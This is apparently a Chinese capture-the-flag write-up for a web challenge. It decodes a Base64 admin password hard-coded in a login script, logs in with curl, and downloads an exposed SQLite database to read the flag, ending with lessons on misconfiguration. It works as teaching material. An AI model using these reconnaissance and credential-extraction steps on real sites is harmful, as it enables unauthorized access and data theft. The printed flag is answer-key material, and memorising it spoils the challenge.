## 题目原文

> IT运维部前几天弄了个新的『系统诊断面板』，说这样排查服务器问题方便多了。但这破面板连个验证码都没有，我严重怀疑开发为了图省事，偷偷把超管密码硬编码在某个地方了。你能帮我进去看看，然后利用里面的日志查询功能找出藏在数据库里的 flag 吗？

## 题解

### 入口与指纹

`Apache/2.4.54 (Debian)` + `PHP/7.4.33`，首页是登录页（`系统诊断面板`），页面引用两个静态资源：

```html
<link href="css/style.css" rel="stylesheet">
<script src="js/login.js"></script>
```

登录页底部有一个「开发者帮助」链接，`id="devHelpLinks"`，`href="#"`。

### 关键观察

**1. `js/login.js` 里硬编码了超管口令，而且是可逆的编码。**

```js
// Developer autofill function for testing purposes
// TODO: Remove this before production deployment!
// Default testing credentials:
// u: admin
devHelpLink.addEventListener('click', function (e) {
    if (confirm("Auto-fill testing credentials? (Dev Only)")) {
        uInput.value = 'admin';
        // Added simple obfuscation for security in dev phase.
        pInput.value = atob('QURNSU4xMkAxMjMh');
    }
});
```

`atob('QURNSU4xMkAxMjMh')` 是 `ADMIN12@123!`。「简单混淆」只是 Base64，不是加密。

**2. 登录后的 `dashboard.php` 返回 200 但 0 字节。**

用正确口令登录后 `index.php` 302 到 `dashboard.php`，但 `dashboard.php` 无论带不带会话都返回 `Content-Length: 0`。也就是说这道题在实际部署里**登录后的页面是空的**，日志查询功能并没有真的渲染出来。

**3. 但数据库文件本身是可直接下载的。**

目录枚举发现 `/db/` 存在（403，禁止列表），而 `/db/sysdiag.db` 是 **200，16384 字节的 SQLite 文件**。Apache 只禁止了目录索引，没有禁止 `.db` 文件。

### 利用链

**Step 1：从 JS 解出口令并登录。**

```bash
T=10.0.0.0   # 本例地址已失效
PW=$(curl -s "http://$T/js/login.js" | grep -oE "atob\('[^']+'\)" | sed "s/atob('//;s/')//" | base64 -d)
# ADMIN12@123!

curl -s -c cj -D- -o /dev/null -X POST \
  --data-urlencode 'username=admin' --data-urlencode "password=$PW" \
  "http://$T/index.php"
# HTTP/1.1 302 Found
# Location: dashboard.php
```

口令正确时返回 302；错误口令返回 200 + 登录页（1541 字节）。这个差别可以当登录成功的判据。

**Step 2：`dashboard.php` 是空的，换思路找数据。**

```bash
curl -s -b cj "http://$T/dashboard.php" -w '%{size_download}\n'
# 0
```

参数（`?page=`、`?action=`、`?query=` …）、POST、JSON body 都试过，始终 0 字节。于是转向文件系统：`/db/` 目录存在但索引 403，直接猜文件名。

**Step 3：下载 SQLite 并读 flag。**

```bash
curl -s "http://$T/db/sysdiag.db" -o sysdiag.db
file sysdiag.db
# SQLite 3.x database

sqlite3 sysdiag.db '.tables'
# config  system_logs

sqlite3 sysdiag.db 'select * from config;'
# 1|system_flag|flag{05d2ef49-8a38-43c3-a674-257396769739}
```

`config` 表只有一行：`system_flag`。`system_logs` 表是 5 条干扰日志（其中一条 `ERROR: Failed to connect to backend authentication service!` 解释了为什么登录后页面是空的）。

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `/db/sysdiag.db` 的 `config` 表 `system_flag` 字段 |

### 复盘

- **前端 JS 里的 `atob`/`btoa` 只是编码。** 看到 `atob('...')` 先解一遍，成本一次命令；本题的超管口令就这么拿到的。
- **「登录成功」的判据是状态码变化。** 正确口令 302、错误口令 200 + 登录页，这是最可靠的成功信号，比页面文字更稳。
- **不要把「登录后页面空白」当成死路。** 这道题的页面确实渲染不出来（0 字节），但数据库文件本身暴露在 Web 根目录下。**先枚举目录，再决定要不要修页面**。
- **`/db/` 403 不等于里面拿不到。** 403 只说明目录索引被禁；猜文件名（`sysdiag.db`、`*.sqlite`、`*.db`）往往直接 200。
- **`.db` 不在 Apache 的默认拒绝列表里。** nginx/Apache 常见配置会禁 `.sql`，但很少禁 `.db`/`.sqlite`，这是很典型的「备份/数据文件放错位置」漏洞。
